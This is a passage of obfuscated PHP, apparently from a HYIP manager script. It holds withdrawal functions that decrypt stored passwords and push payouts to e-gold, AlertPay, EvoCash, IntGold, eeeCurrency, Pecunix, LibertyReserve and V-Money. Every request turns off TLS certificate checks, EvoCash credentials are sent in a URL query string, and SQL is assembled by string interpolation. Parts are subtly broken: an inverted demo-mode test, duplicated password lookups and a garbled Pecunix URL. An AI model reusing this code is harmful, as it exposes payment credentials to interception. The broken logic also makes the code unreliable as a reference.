            {
                $elnlcFyUlc = elnlczrwm( $elnlcPSitf[$elnlcbhAzL['elnlcDOLC']], $elnlcbhAzL['elnlcBJyh'] );
            }
        }
        else
        {
            $elnlcFyUlc = $elnlcDxIpr;
        }
        $elnlcVCFRQ = curl_init( );
        $elnlcykqSE = rawurlencode( $elnlcykqSE );
        curl_setopt( $elnlcVCFRQ, CURLOPT_URL, "https://www.e-gold.com/acct/confirm.asp" );
        curl_setopt( $elnlcVCFRQ, CURLOPT_POST, 1 );
        curl_setopt( $elnlcVCFRQ, CURLOPT_POSTFIELDS, "AccountID=".rawurlencode( $elnlctVnzQ[$elnlcbhAzL['elnlcxzUP']] )."&PassPhrase=".rawurlencode( $elnlcFyUlc )."&Payee_Account=".rawurlencode( $elnlcJfxRK )."&Amount=".rawurlencode( $elnlcekLao )."&PAY_IN=".rawurlencode( $elnlctVnzQ[$elnlcbhAzL['elnlcDhfLC']] )."&WORTH_OF=Gold&Memo={$elnlcykqSE}&IGNORE_RATE_CHANGE=y" );
        curl_setopt( $elnlcVCFRQ, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $elnlcVCFRQ, CURLOPT_RETURNTRANSFER, 1 );
        $a = curl_exec( $elnlcVCFRQ );
        curl_close( $elnlcVCFRQ );
        $elnlcQwChW = array( );
        if ( preg_match( "/<input type=hidden name=PAYMENT_BATCH_NUM VALUE=\"(\\d+)\">/ims", $a, $elnlcQwChW ) )
        {
            return array( 1, "", $elnlcQwChW[1] );
        }
        else
        {
            if ( preg_match( "/<input type=hidden name=ERROR VALUE=\"(.*?)\">/ims", $a, $elnlcQwChW ) )
            {
                $elnlcGwtr = preg_replace( "/&lt;/i", "<", $elnlcQwChW[1] );
                $elnlcGwtr = preg_replace( "/&gt;/i", ">", $elnlcGwtr );
                $e = elnlcdjxb( "{$elnlcstWo} {$elnlcGwtr}" );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $elnlcstWo." {$elnlcGwtr}", "" );
            }
            else
            {
                $e = elnlcdjxb( "{$elnlcstWo} Unknown error" );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $elnlcstWo." Unknown error", "" );
            }
        }
    }
    else
    {
        $e = elnlcdjxb( "{$elnlcstWo} Curl functions are not available" );
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
        mysql_query( $q );
        return array( 0, $elnlcstWo." Curl functions are not available" );
    }
}

function elnlcnzsb( $elnlcDxIpr, $elnlcekLao, $elnlcJfxRK, $elnlcykqSE, $elnlcstWo )
{
    global $elnlcbhAzL;
    global $elnlctVnzQ;
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcTxqa']] == $elnlcbhAzL['elnlcbCzgf'] )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcfibk']] == 1 )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlcJfxRK == "" )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = 'Can`t process withdrawal to AlertPay account 0.'";
        mysql_query( $q );
        return array( 0, "Invalid AlertPay account", "" );
    }
    $elnlccwmRh = elnlchilr( $elnlcJfxRK, 11 )[1];
    $elnlcKOsIk = elnlchilr( $elnlcJfxRK, 11 )[0];
    if ( $elnlcKOsIk == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$elnlccwmRh}'";
        mysql_query( $q );
        return array( 0, $elnlccwmRh );
    }
    if ( function_exists( "curl_init" ) )
    {
        if ( $elnlcDxIpr == "" )
        {
            $q = "select v from hm2_pay_settings where n='alertpay_account_password'";
            $elnlcRLPe = mysql_query( $q );
            while ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
            {
                $elnlchSMw = elnlczrwm( $elnlcPSitf[$elnlcbhAzL['elnlcDOLC']], $elnlcbhAzL['elnlcBJyh'] );
            }
        }
        else
        {
            $elnlchSMw = $elnlcDxIpr;
        }
        $elnlcVCFRQ = curl_init( );
        $elnlcykqSE = rawurlencode( $elnlcykqSE );
        $elnlcKIydR = sprintf( "USER=%s&PASSWORD=%s&AMOUNT=%s&CURRENCY=%s&RECEIVEREMAIL=%s&SENDEREMAIL=%s&PURCHASETYPE=%s&NOTE=%s&TESTMODE=%s", urlencode( $elnlctVnzQ[$elnlcbhAzL['elnlcbakxM']] ), urlencode( $elnlchSMw ), urlencode( $elnlcekLao ), "USD", urlencode( $elnlcJfxRK ), "", 0, urlencode( $elnlcykqSE ), 0 );
        curl_setopt( $elnlcVCFRQ, CURLOPT_URL, $elnlcbhAzL['elnlciwhp'] );
        curl_setopt( $elnlcVCFRQ, CURLOPT_POST, true );
        curl_setopt( $elnlcVCFRQ, CURLOPT_POSTFIELDS, $elnlcKIydR );
        curl_setopt( $elnlcVCFRQ, CURLOPT_RETURNTRANSFER, true );
        curl_setopt( $elnlcVCFRQ, CURLOPT_HEADER, false );
        curl_setopt( $elnlcVCFRQ, CURLOPT_TIMEOUT, 30 );
        curl_setopt( $elnlcVCFRQ, CURLOPT_SSL_VERIFYPEER, false );
        $a = curl_exec( $elnlcVCFRQ );
        curl_close( $elnlcVCFRQ );
        parse_str( urldecode( $a ), $elnlcHuaAE );
        $elnlcQwChW = array( );
        if ( $elnlcHuaAE[$elnlcbhAzL['elnlcmEkr']] == 100 )
        {
            return array( 1, "", $elnlcHuaAE[$elnlcbhAzL['elnlcaleJ']] );
        }
        else
        {
            if ( 200 < $elnlcHuaAE[$elnlcbhAzL['elnlcmEkr']] )
            {
                $elnlcGwtr = $elnlcHuaAE[$elnlcbhAzL['elnlcmEkr']].": ".$elnlcHuaAE[$elnlcbhAzL['elnlcWfClG']];
                $e = elnlcdjxb( "{$elnlcstWo} {$elnlcGwtr}" );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $elnlcstWo." {$elnlcGwtr}", "" );
            }
            else
            {
                $e = elnlcdjxb( "{$elnlcstWo} Unknown error" );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $elnlcstWo." Unknown error", "" );
            }
        }
    }
    else
    {
        $e = elnlcdjxb( "{$elnlcstWo} Curl functions are not available" );
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
        mysql_query( $q );
        return array( 0, $elnlcstWo." Curl functions are not available" );
    }
}

function elnlcckaah( $elnlcDxIpr, $elnlcekLao, $elnlcJfxRK, $elnlcykqSE, $elnlcstWo )
{
    global $elnlcbhAzL;
    global $elnlctVnzQ;
    $elnlcekLao = sprintf( "%0.2f", floor( $elnlcekLao * 100 ) / 100 );
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcfibk']] == 1 )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlcJfxRK == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = 'Can not process withdrawal to Evocash account 0.'";
        mysql_query( $q );
        return array( 0, "Invalid EvoCash account", "" );
    }
    list( $elnlcKOsIk, $elnlccwmRh ) = elnlchilr( $elnlcJfxRK, 1 );
    if ( $elnlcKOsIk == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$elnlccwmRh}'";
        mysql_query( $q );
        return array( 0, $elnlccwmRh );
    }
    if ( function_exists( "curl_init" ) )
    {
        if ( $elnlcDxIpr == "" )
        {
            $q = "select v from hm2_pay_settings where n='evocash_account_password'";
            $elnlcRLPe = mysql_query( $q );
            while ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
            {
                $elnlcpiaF = elnlczrwm( $elnlcPSitf[$elnlcbhAzL['elnlcDOLC']], $elnlcbhAzL['elnlcBJyh'] );
            }
            $q = "select v from hm2_pay_settings where n='evocash_transaction_code'";
            $elnlcRLPe = mysql_query( $q );
            while ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
            {
                $elnlcPyLIU = elnlczrwm( $elnlcPSitf[$elnlcbhAzL['elnlcDOLC']], $elnlcbhAzL['elnlcBJyh'] );
            }
        }
        else
        {
            list( $elnlcpiaF, $elnlcPyLIU ) = preg_split( "/\\|/", $elnlcDxIpr );
        }
        $elnlcVCFRQ = curl_init( );
        $elnlcykqSE = rawurlencode( $elnlcykqSE );
        curl_setopt( $elnlcVCFRQ, CURLOPT_URL, "https://www.evocash.com/evoswift/instantpayment.cfm?payingaccountid=".rawurlencode( $elnlctVnzQ[$elnlcbhAzL['elnlcUavWu']] )."&username=".rawurlencode( $elnlctVnzQ[$elnlcbhAzL['elnlcFETv']] )."&password=".rawurlencode( $elnlcpiaF )."&transaction_code=".rawurlencode( $elnlcPyLIU )."&amount=".rawurlencode( $elnlcekLao )."&reference=&memo={$elnlcykqSE}&receivingaccountid=".rawurlencode( $elnlcJfxRK )."" );
        curl_setopt( $elnlcVCFRQ, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $elnlcVCFRQ, CURLOPT_RETURNTRANSFER, 1 );
        $a = curl_exec( $elnlcVCFRQ );
        curl_close( $elnlcVCFRQ );
        $elnlcQwChW = array( );
        if ( preg_match( "/<INPUT TYPE=\"Hidden\" NAME=\"PayingTransactionID\" VALUE=\"(.*?)\">/ims", $a, $elnlcQwChW ) )
        {
            return array( 1, "", $elnlcQwChW[1] );
        }
        else
        {
            if ( preg_match( "/<INPUT TYPE=\"Hidden\" NAME=\"Error\" VALUE=\"(.*?)\">/ims", $a, $elnlcQwChW ) )
            {
                $elnlcGwtr = $elnlcQwChW[1];
                $e = elnlcdjxb( "{$elnlcstWo} {$elnlcGwtr}" );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $elnlcstWo." {$elnlcGwtr}", "" );
            }
            else
            {
                $e = elnlcdjxb( "{$elnlcstWo} Unknown error" );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $elnlcstWo." Unknown error", "" );
            }
        }
    }
    else
    {
        $e = elnlcdjxb( "{$elnlcstWo} Curl functions are not available" );
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
        mysql_query( $q );
        return array( 0, $elnlcstWo." Curl functions are not available" );
    }
}

function elnlcawoqk( $elnlcDxIpr, $elnlcekLao, $elnlcJfxRK, $elnlcykqSE, $elnlcstWo )
{
    global $elnlcbhAzL;
    global $elnlctVnzQ;
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcTxqa']] == $elnlcbhAzL['elnlcbCzgf'] )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcfibk']] == 1 )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlcJfxRK == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = 'Can`t process withdrawal to IntGold account 0.'";
        mysql_query( $q );
        return array( 0, "Invalid IntGold account", "" );
    }
    $elnlccwmRh = elnlchilr( $elnlcJfxRK, 2 )[1];
    $elnlcKOsIk = elnlchilr( $elnlcJfxRK, 2 )[0];
    if ( $elnlcKOsIk == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$elnlccwmRh}'";
        mysql_query( $q );
        return array( 0, $elnlccwmRh );
    }
    if ( function_exists( "curl_init" ) )
    {
        if ( $elnlcDxIpr == "" )
        {
            $q = "select v from hm2_pay_settings where n='intgold_password'";
            $elnlcRLPe = mysql_query( $q );
            while ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
            {
                $elnlclqfKe = elnlczrwm( $elnlcPSitf[$elnlcbhAzL['elnlcDOLC']], $elnlcbhAzL['elnlcBJyh'] );
            }
        }
        else
        {
            $elnlclqfKe = $elnlcDxIpr;
        }
        if ( $elnlcDxIpr == "" )
        {
            $q = "select v from hm2_pay_settings where n='intgold_password'";
            $elnlcRLPe = mysql_query( $q );
            while ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
            {
                $elnlclqfKe = elnlczrwm( $elnlcPSitf[$elnlcbhAzL['elnlcDOLC']], $elnlcbhAzL['elnlcBJyh'] );
            }
            $q = "select v from hm2_pay_settings where n='intgold_transaction_code'";
            $elnlcRLPe = mysql_query( $q );
            while ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
            {
                $elnlcoVHFF = elnlczrwm( $elnlcPSitf[$elnlcbhAzL['elnlcDOLC']], $elnlcbhAzL['elnlcBJyh'] );
            }
        }
        else
        {
            $elnlcoVHFF = preg_split( "/\\|/", $elnlcDxIpr )[1];
            $elnlclqfKe = preg_split( "/\\|/", $elnlcDxIpr )[0];
        }
        $elnlcVCFRQ = curl_init( );
        $elnlcykqSE = rawurlencode( $elnlcykqSE );
        curl_setopt( $elnlcVCFRQ, CURLOPT_URL, "https://intgold.com/cgi-bin/autopay.cgi" );
        curl_setopt( $elnlcVCFRQ, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $elnlcVCFRQ, CURLOPT_POST, 1 );
        curl_setopt( $elnlcVCFRQ, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" );
        curl_setopt( $elnlcVCFRQ, CURLOPT_POSTFIELDS, "ACCOUNTID=".rawurlencode( $elnlctVnzQ[$elnlcbhAzL['elnlclpBOq']] )."&PASSWORD=".rawurlencode( $elnlclqfKe )."&SECPASSWORD=".rawurlencode( $elnlcoVHFF )."&RECEIVER=".rawurlencode( $elnlcJfxRK )."&AMOUNT=".rawurlencode( $elnlcekLao )."&NOTE=".$elnlcykqSE );
        curl_setopt( $elnlcVCFRQ, CURLOPT_RETURNTRANSFER, 1 );
        curl_setopt( $elnlcVCFRQ, CURLOPT_RETURNTRANSFER, 1 );
        $a = curl_exec( $elnlcVCFRQ );
        curl_close( $elnlcVCFRQ );
        $elnlcQwChW = array( );
        if ( preg_match( "/Success\\s*TRANSACTION_ID:(.*?)$/ims", $a, $elnlcQwChW ) )
        {
            return array( 1, "", $elnlcQwChW[1] );
        }
        else
        {
            $e = elnlcdjxb( "{$elnlcstWo} {$a}" );
            $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
            mysql_query( $q );
            return array( 0, $elnlcstWo." {$a}", "" );
        }
    }
    else
    {
        $e = elnlcdjxb( "{$elnlcstWo} Curl functions are not available" );
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
        mysql_query( $q );
        return array( 0, $elnlcstWo." Curl functions are not available" );
    }
}

function elnlcxqdc( $elnlcDxIpr, $elnlcekLao, $elnlcJfxRK, $elnlcykqSE, $elnlcstWo )
{
    global $elnlcbhAzL;
    global $elnlctVnzQ;
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcTxqa']] == $elnlcbhAzL['elnlcbCzgf'] )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcfibk']] == 1 )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlcJfxRK == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = 'Can`t process withdrawal to eeeCureency account 0.'";
        mysql_query( $q );
        return array( 0, "Invalid eeeCurrency account", "" );
    }
    $elnlccwmRh = elnlchilr( $elnlcJfxRK, 8 )[1];
    $elnlcKOsIk = elnlchilr( $elnlcJfxRK, 8 )[0];
    if ( $elnlcKOsIk == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$elnlccwmRh}'";
        mysql_query( $q );
        return array( 0, $elnlccwmRh );
    }
    if ( function_exists( "curl_init" ) )
    {
        if ( $elnlcDxIpr == "" )
        {
            $q = "select v from hm2_pay_settings where n='eeecurrency_password'";
            $elnlcRLPe = mysql_query( $q );
            while ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
            {
                $elnlcCGqOI = elnlczrwm( $elnlcPSitf[$elnlcbhAzL['elnlcDOLC']], $elnlcbhAzL['elnlcBJyh'] );
            }
            $q = "select v from hm2_pay_settings where n='eeecurrency_transaction_code'";
            $elnlcRLPe = mysql_query( $q );
            while ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
            {
                $elnlcSnAT = elnlczrwm( $elnlcPSitf[$elnlcbhAzL['elnlcDOLC']], $elnlcbhAzL['elnlcBJyh'] );
            }
        }
        else
        {
            $elnlcSnAT = preg_split( "/\\|/", $elnlcDxIpr )[1];
            $elnlcCGqOI = preg_split( "/\\|/", $elnlcDxIpr )[0];
        }
        $elnlcVCFRQ = curl_init( );
        $elnlcykqSE = rawurlencode( $elnlcykqSE );
        curl_setopt( $elnlcVCFRQ, CURLOPT_URL, "https://eeecurrency.com/cgi-bin/autopay.cgi" );
        curl_setopt( $elnlcVCFRQ, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $elnlcVCFRQ, CURLOPT_POST, 1 );
        curl_setopt( $elnlcVCFRQ, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" );
        curl_setopt( $elnlcVCFRQ, CURLOPT_POSTFIELDS, "ACCOUNTID=".rawurlencode( $elnlctVnzQ[$elnlcbhAzL['elnlckTJV']] )."&PASSWORD=".rawurlencode( $elnlcCGqOI )."&SECPASSWORD=".rawurlencode( $elnlcSnAT )."&RECEIVER=".rawurlencode( $elnlcJfxRK )."&AMOUNT=".rawurlencode( $elnlcekLao )."&NOTE={$elnlcykqSE}" );
        curl_setopt( $elnlcVCFRQ, CURLOPT_RETURNTRANSFER, 1 );
        $a = curl_exec( $elnlcVCFRQ );
        curl_close( $elnlcVCFRQ );
        $elnlcQwChW = array( );
        if ( preg_match( "/Success\\s*TRANSACTION_ID:(.*?)$/ims", $a, $elnlcQwChW ) )
        {
            return array( 1, "", $elnlcQwChW[1] );
        }
        else
        {
            $e = elnlcdjxb( "{$elnlcstWo} {$a}" );
            $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
            mysql_query( $q );
            return array( 0, $elnlcstWo." {$a}", "" );
        }
    }
    else
    {
        $e = elnlcdjxb( "{$elnlcstWo} Curl functions are not available" );
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
        mysql_query( $q );
        return array( 0, $elnlcstWo." Curl functions are not available" );
    }
}

function elnlcjgjcd( $elnlcDxIpr, $elnlcekLao, $elnlcJfxRK, $elnlcykqSE, $elnlcstWo )
{
    global $elnlcbhAzL;
    global $elnlctVnzQ;
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcTxqa']] == $elnlcbhAzL['elnlcbCzgf'] )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcfibk']] == 1 )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlcJfxRK == "" )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = 'Can`t process withdrawal to empty Pecunix account.'";
        mysql_query( $q );
        return array( 0, "Invalid Pecunix account", "" );
    }
    $elnlccwmRh = elnlchilr( $elnlcJfxRK, 9 )[1];
    $elnlcKOsIk = elnlchilr( $elnlcJfxRK, 9 )[0];
    if ( $elnlcKOsIk == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$elnlccwmRh}'";
        mysql_query( $q );
        return array( 0, $elnlccwmRh );
    }
    if ( function_exists( "curl_init" ) )
    {
        if ( $elnlcDxIpr == "" )
        {
            $q = "select v from hm2_pay_settings where n='pecunix_password'";
            $elnlcRLPe = mysql_query( $q );
            while ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
            {
                $elnlcJbwP = elnlczrwm( $elnlcPSitf[$elnlcbhAzL['elnlcDOLC']], $elnlcbhAzL['elnlcBJyh'] );
            }
        }
        else
        {
            $elnlcJbwP = $elnlcDxIpr;
        }
        $elnlcVCFRQ = curl_init( );
        $elnlctuCBn = elnlclytuv( "{px_time}" );
        $elnlcuLEl = strtoupper( md5( $elnlcJbwP.":".$elnlctuCBn ) );
        $elnlcKIydR = "\r\n    <TransferRequest>\r\n      <Transfer>\r\n        <TransferId> </TransferId>\r\n        <Payer> ".htmlentities( $elnlctVnzQ[$elnlcbhAzL['elnlcKaoA']], ENT_NOQUOTES )." </Payer>\r\n        <Payee> ".htmlentities( $elnlcJfxRK, ENT_NOQUOTES )." </Payee>\r\n        <CurrencyId> GAU </CurrencyId>\r\n        <Equivalent>\r\n          <CurrencyId> USD </CurrencyId>\r\n          <Amount> ".htmlentities( $elnlcekLao, ENT_NOQUOTES )." </Amount>\r\n        </Equivalent>\r\n        <FeePaidBy> Payee </FeePaidBy>\r\n        <Memo> ".htmlentities( $elnlcykqSE, ENT_NOQUOTES )." </Memo>\r\n      </Transfer>\r\n      <Auth>\r\n        <Token> {$elnlcuLEl} </Token>\r\n      </Auth>\r\n    </TransferRequest>\r\n    ";
        $elnlcVCFRQ = curl_init( );
        curl_setopt( $elnlcVCFRQ, CURLOPT_URL, "https://pxi.pecunix.com/money.refined...transfer" );
        curl_setopt( $elnlcVCFRQ, CURLOPT_POST, 1 );
        curl_setopt( $elnlcVCFRQ, CURLOPT_POSTFIELDS, $elnlcKIydR );
        curl_setopt( $elnlcVCFRQ, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $elnlcVCFRQ, CURLOPT_RETURNTRANSFER, 1 );
        $a = curl_exec( $elnlcVCFRQ );
        curl_close( $elnlcVCFRQ );
        $elnlcVRAGE = elnlckgqti( $a );
        if ( $elnlcVRAGE[$elnlcbhAzL['elnlcdgqQo']] == $elnlcbhAzL['elnlcJdcEW'] )
        {
            return array( 1, "", $elnlcVRAGE[$elnlcbhAzL['elnlccDio']] );
        }
        else
        {
            if ( $elnlcVRAGE[$elnlcbhAzL['elnlcdgqQo']] == $elnlcbhAzL['elnlcMcIo'] )
            {
                $e = elnlcdjxb( "{$elnlcstWo} ".$elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']]." ".$elnlcVRAGE[$elnlcbhAzL['elnlcARIU']] );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $e, "" );
            }
            else
            {
                $e = elnlcdjxb( "{$elnlcstWo} Parse error: {$a}" );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $e, "" );
            }
        }
    }
    else
    {
        $e = elnlcdjxb( "{$elnlcstWo} Curl functions are not available" );
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
        mysql_query( $q );
        return array( 0, $elnlcstWo." Curl functions are not available" );
    }
}

function elnlcfqpp( $elnlcDxIpr, $elnlcekLao, $elnlcJfxRK, $elnlcykqSE, $elnlcstWo )
{
    global $elnlcbhAzL;
    global $elnlctVnzQ;
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcTxqa']] == $elnlcbhAzL['elnlcbCzgf'] )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcfibk']] == 1 )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlcJfxRK == "" )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = 'Can`t process withdrawal to empty LibertyReserve account.'";
        mysql_query( $q );
        return array( 0, "Invalid LibertyReserve account", "" );
    }
    $elnlccwmRh = elnlchilr( $elnlcJfxRK, 15 )[1];
    $elnlcKOsIk = elnlchilr( $elnlcJfxRK, 15 )[0];
    if ( $elnlcKOsIk == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$elnlccwmRh}'";
        mysql_query( $q );
        return array( 0, $elnlccwmRh );
    }
    if ( function_exists( "curl_init" ) )
    {
        if ( $elnlcDxIpr == "" )
        {
            $q = "select v from hm2_pay_settings where n='libertyreserve_password'";
            $elnlcRLPe = mysql_query( $q );
            while ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
            {
                $elnlcBqklO = elnlczrwm( $elnlcPSitf[$elnlcbhAzL['elnlcDOLC']], $elnlcbhAzL['elnlcBJyh'] );
            }
            $elnlcqwFEf = $elnlctVnzQ[$elnlcbhAzL['elnlcxuer']];
        }
        else
        {
            $elnlcqwFEf = preg_split( "/\\|/", $elnlcDxIpr )[1];
            $elnlcBqklO = preg_split( "/\\|/", $elnlcDxIpr )[0];
        }
        $elnlcVCFRQ = curl_init( );
        $elnlcuLEl = strtoupper( elnlclytuv( $elnlcBqklO.":{lr_time}" ) );
        $elnlcKIydR = "<TransferRequest id=\"".rand( 1000000, 9999999 )."\">\r\n  <Auth>\r\n    <ApiName>".htmlspecialchars( $elnlcqwFEf )."</ApiName>\r\n    <Token>{$elnlcuLEl}</Token>\r\n  </Auth>\r\n  <Transfer>\r\n    <TransferType>transfer</TransferType>\r\n    <Payer>".htmlentities( $elnlctVnzQ[$elnlcbhAzL['elnlcCEKPl']], ENT_NOQUOTES )."</Payer>\r\n    <Payee>".htmlentities( $elnlcJfxRK, ENT_NOQUOTES )."</Payee>\r\n    <CurrencyId>".htmlentities( $elnlctVnzQ[$elnlcbhAzL['elnlcqsrR']] )."</CurrencyId>\r\n    <Amount>".htmlentities( $elnlcekLao, ENT_NOQUOTES )."</Amount>\r\n    <Memo>".htmlentities( $elnlcykqSE, ENT_NOQUOTES )."</Memo>\r\n    <Anonymous>false</Anonymous>\r\n  </Transfer>\r\n</TransferRequest>";
        $elnlcVCFRQ = curl_init( );
        curl_setopt( $elnlcVCFRQ, CURLOPT_URL, "https://api.libertyreserve.com/xml/transfer.aspx?req=".urlencode( $elnlcKIydR ) );
        curl_setopt( $elnlcVCFRQ, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $elnlcVCFRQ, CURLOPT_RETURNTRANSFER, 1 );
        $elnlciipfT = array( "User-Agent: Mozilla/5.0" );
        curl_setopt( $elnlcVCFRQ, CURLOPT_HTTPHEADER, $elnlciipfT );
        $a = curl_exec( $elnlcVCFRQ );
        curl_close( $elnlcVCFRQ );
        $elnlctVnzQ[$elnlcbhAzL['elnlcSFNWm']] = $elnlcKIydR;
        $elnlctVnzQ[$elnlcbhAzL['elnlcQysB']] = $a;
        $elnlcVRAGE = elnlcpijq( $a );
        if ( $elnlcVRAGE[$elnlcbhAzL['elnlcdgqQo']] == $elnlcbhAzL['elnlcJdcEW'] )
        {
            return array( 1, "", $elnlcVRAGE[$elnlcbhAzL['elnlccDio']] );
        }
        else
        {
            if ( $elnlcVRAGE[$elnlcbhAzL['elnlcdgqQo']] == $elnlcbhAzL['elnlcMcIo'] )
            {
                $e = elnlcdjxb( "{$elnlcstWo} ".$elnlcVRAGE[$elnlcbhAzL['elnlczSGMs']]."<br>".$elnlcVRAGE[$elnlcbhAzL['elnlcARIU']] );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $e, "" );
            }
            else
            {
                $e = elnlcdjxb( "{$elnlcstWo} Parse error: {$a}" );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $e, "" );
            }
        }
    }
    else
    {
        $e = elnlcdjxb( "{$elnlcstWo} Curl functions are not available" );
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
        mysql_query( $q );
        return array( 0, $elnlcstWo." Curl functions are not available" );
    }
}

function elnlcrpns( $elnlcDxIpr, $elnlcekLao, $elnlcJfxRK, $elnlcykqSE, $elnlcstWo )
{
    global $elnlcbhAzL;
    global $elnlctVnzQ;
    if ( !( $elnlctVnzQ[$elnlcbhAzL['elnlcTxqa']] == $elnlcbhAzL['elnlcbCzgf'] ) || $elnlctVnzQ[$elnlcbhAzL['elnlcfibk']] == 1 )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlcJfxRK == "" )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = 'Can`t process withdrawal to empty V-Money account.'";
        mysql_query( $q );
        return array( 0, "Invalid V-Money account", "" );
    }
    $elnlccwmRh = elnlchilr( $elnlcJfxRK, 16 )[1];
    $elnlcKOsIk = elnlchilr( $elnlcJfxRK, 16 )[0];
    if ( $elnlcKOsIk == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$elnlccwmRh}'";
        mysql_query( $q );
        return array( 0, $elnlccwmRh );
    }
    if ( function_exists( "curl_init" ) )
    {
        if ( $elnlcDxIpr == "" )
        {
            $q = "select v from hm2_pay_settings where n='vmoney_password'";
            $elnlcRLPe = mysql_query( $q );
            while ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
            {
                $elnlchGew = elnlczrwm( $elnlcPSitf[$elnlcbhAzL['elnlcDOLC']], $elnlcbhAzL['elnlcBJyh'] );
            }
        }
        else
        {
            $elnlchGew = $elnlcDxIpr;
        }
        $elnlcuLEl = md5( $elnlctVnzQ[$elnlcbhAzL['elnlcztSyn']].$elnlchGew.elnlclytuv( "{vm_time}" ) );
